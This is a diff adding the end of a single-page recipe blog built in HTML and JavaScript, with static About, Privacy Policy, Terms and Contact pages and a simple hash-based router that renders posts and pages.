+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Purple Fruits</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nutrient Dense Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Colorful Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plant Based Nutrition</span>
+</div>
+
+                `
+                        }
+        ];
+       
+        // Static Legal Pages (Exact content & keys preserved)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Core Logic (Preserved entirely)
+        const app = document.getElementById('app');
+        const blogUsername = "Katy Deliciously Easy Recipes Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder avatar image path
+
+        // Function to render the home dashboard (list of recipe posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 2px; font-size: 1rem; color: var(--primary-color);">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (e.g. Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 10px; padding-bottom: 10px;">
+                        <h1 style="font-family: 'Playfair Display', serif; font-size: 2.5rem; margin-bottom: 30px;">${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Smooth scroll to top
+        }
+
+        // Function to render a single post detail view
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 2px; font-size: 1rem; color: var(--primary-color);">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Smooth scroll to top
+        }
+
+        // Client-side router navigation logic
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser navigation interactions (back/forward hashes)
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initialize view router on fresh load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
